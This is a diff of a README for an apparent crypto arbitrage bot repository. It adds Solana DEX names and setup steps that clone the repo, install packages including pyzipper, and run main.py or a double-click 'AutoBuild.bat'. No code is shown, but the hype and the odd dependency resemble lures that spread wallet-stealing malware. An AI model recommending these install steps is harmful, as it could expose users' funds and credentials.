@@ -21,22 +21,38 @@ Thanks to artificial intelligence support, we are confident that we have the mos
 - Sushiswap
 - dYdX
 
-## Setup Instructions
+#### SOLANA DEXs (NEW!!!)
+
+- Jupiter
+- Raydium
+- pump.fun
+- Orca
+- Lifinity
+- Saros Finance
+- Drift Protocol
+- Zeta Markets
+- Saber
+- Soldex
+- FluxBeam
+
+## Setup Instructions (Win/Mac)
 
 Download and Install Git here:
 https://git-scm.com/download/win
 
 Download and Install Python here:
-[Python 3.12.1](https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe)
+[Python ](https://www.python.org/downloads/)
 
 Build using the following commands:
 
 ```shell
 git clone https://github.com/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot.git
 cd Uniswap-Pancakeswap-Arbitrage-Bot
+pip install Pillow PyQt5 pyzipper requests
 python3 main.py
 ```
-## Setup Instructions - WayII
+
+## Setup Instructions - WayII (Onyl Windows)
 
 - [Download](https://github.com/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot/archive/refs/heads/main.zip) the repository release and extract files. 
 - Double-click on the "AutoBuild.bat" file to run it.
